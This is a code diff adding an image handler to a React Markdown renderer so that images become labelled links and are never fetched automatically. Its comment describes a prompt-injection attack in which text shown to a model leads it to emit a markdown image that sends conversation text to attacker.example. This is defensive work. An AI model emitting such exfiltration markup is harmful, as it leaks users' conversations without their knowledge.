@@ -26,6 +26,32 @@ export const Markdown = memo(function Markdown({ content }: { content: string })
             );
           },
 
+          /*
+           * Never fetched. A model can be steered by text it was shown (a
+           * pasted document, a quoted email) into emitting
+           * `![](https://attacker.example/?q=<conversation text>)`, and an
+           * <img> would send that request the moment the answer rendered —
+           * no click, no visible sign. The image becomes a labelled link the
+           * reader can choose to open, so nothing leaves without consent.
+           */
+          img({ src, alt }) {
+            const label = alt?.trim() ? alt : 'image';
+            const href = typeof src === 'string' ? src : '';
+            if (!href || !SAFE_SCHEME.test(href) || href.toLowerCase().startsWith('mailto:')) {
+              return <span className="md-image-ref">[{label}]</span>;
+            }
+            return (
+              <a
+                href={href}
+                target="_blank"
+                rel="noopener noreferrer nofollow"
+                className="md-image-ref"
+              >
+                [Image: {label}]
+              </a>
+            );
+          },
+
           pre({ children }) {
             return <>{children}</>;
           },
